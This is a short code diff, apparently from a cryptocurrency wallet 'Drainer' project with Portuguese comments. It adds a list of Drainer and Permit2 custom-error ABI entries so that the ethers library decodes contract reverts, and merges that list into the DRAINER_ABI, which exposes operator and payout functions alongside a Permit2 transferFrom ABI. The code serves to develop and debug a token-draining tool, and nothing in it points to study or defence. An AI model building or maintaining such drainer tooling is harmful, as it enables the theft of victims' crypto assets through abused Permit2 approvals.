@@ -33,7 +33,24 @@ export const PERMIT2_ABI = [
   "function transferFrom(address,address,uint160,address)",
 ];
 
+// erros (Drainer + Permit2) para o ethers DECODIFICAR o revert em vez de dizer "unknown custom error"
+export const ERROR_ABI = [
+  "error NotOperator()",
+  "error Expired()",
+  "error BadSignature()",
+  "error AllowanceExpired(uint256 deadline)",
+  "error InsufficientAllowance(uint256 amount)",
+  "error InvalidNonce()",
+  "error SignatureExpired(uint256 sigDeadline)",
+  "error InvalidSigner()",
+  "error InvalidSignature()",
+  "error InvalidSignatureLength()",
+  "error InvalidContractSignature()",
+  "error TransferFailed()",
+];
+
 export const DRAINER_ABI = [
+  ...ERROR_ABI,
   "function operator() view returns (address)",
   "function payout() view returns (address)",
   // componentes nomeados: ethers exige isso para aceitar objeto no lugar da tuple
